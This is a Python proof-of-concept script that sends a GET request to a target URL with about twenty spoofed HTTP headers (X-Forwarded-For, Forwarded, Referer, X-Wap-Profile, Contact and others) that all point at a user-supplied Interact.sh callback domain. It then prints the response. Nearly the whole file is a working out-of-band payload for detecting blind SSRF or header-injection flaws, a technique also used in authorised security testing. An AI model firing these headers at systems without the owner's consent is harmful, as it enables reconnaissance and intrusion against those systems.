import requests  # Import the requests library to handle HTTP requests

import argparse

from colorama import Fore, init



# Initialize colorama for colored output

init(autoreset=True)



def send_oob_request(target_url, interactsh_url):

    # Define the headers for the OOB interaction

    headers = {

        "User-Agent": f"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36 root@{interactsh_url}",

        "Referer": f"http://{interactsh_url}/ref",

        "Cf-Connecting_ip": f"spoofed.{interactsh_url}",

        "X-Real-Ip": f"spoofed.{interactsh_url}",

        "From": f"root@{interactsh_url}",

        "True-Client-Ip": f"spoofed.{interactsh_url}",

        "Client-Ip": f"spoofed.{interactsh_url}",

        "Forwarded": f"for=spoofed.{interactsh_url};by=spoofed.{interactsh_url};host=spoofed.{interactsh_url}",

        "X-Client-Ip": f"spoofed.{interactsh_url}",

        "X-Originating-Ip": f"spoofed.{interactsh_url}",

        "X-Wap-Profile": f"http://{interactsh_url}/wap.xml",

        "X-Forwarded-For": f"spoofed.{interactsh_url}",

        "Contact": f"root@{interactsh_url}",

        "X-Forwarded-Host": f"spoofed.{interactsh_url}",

        "X-Host": f"spoofed.{interactsh_url}",

        "X-Forwarded-Server": f"spoofed.{interactsh_url}",

        "X-HTTP-Host-Override": f"spoofed.{interactsh_url}",

        "Profile": f"http://{interactsh_url}/profile.xml",

        "Cache-Control": "no-transform"

    }



    try:

        # Send the HTTP request to the target with the crafted headers

        print(f"{Fore.YELLOW}[INFO] Sending request to target: {target_url}")

        response = requests.get(target_url, headers=headers)



        # Display the HTTP status code

        print(f"{Fore.GREEN}[SUCCESS] Received HTTP Status Code: {response.status_code}")

        

        # Get the response content

        response_content = response.text



        # Search for the first occurrence of the target URL in the response content

        if target_url in response_content:

            first_occurrence_index = response_content.find(target_url)

            # Show some context around the first occurrence

            preview_start = max(first_occurrence_index - 50, 0)  # 50 characters before the target URL

            preview_end = min(first_occurrence_index + 50, len(response_content))  # 50 characters after the target URL

            

            content_preview = response_content[preview_start:preview_end]

            print(f"{Fore.CYAN}[INFO] First occurrence of '{target_url}' in the response:\n{content_preview}...\n")

        else:

            print(f"{Fore.YELLOW}[INFO] No reference to '{target_url}' found in the response.")



        # Optionally, print the first 500 characters of the response content for general preview

        print(f"{Fore.CYAN}[INFO] Response content preview:\n{response_content[:500]}...\n")



    except Exception as e:

        print(f"{Fore.RED}[ERROR] Failed to send request: {e}")



# Main function to parse arguments and call the request function

def main():

    parser = argparse.ArgumentParser(description="OOB Header-Based Interaction PoC")

    parser.add_argument('target_url', help='The target URL to test (e.g., https://example.com)')

    parser.add_argument('interactsh_url', help='Your Interact.sh domain for OOB testing (e.g., oast.live)')



    args = parser.parse_args()



    # Run the OOB request function

    send_oob_request(args.target_url, args.interactsh_url)



if __name__ == "__main__":

    main()

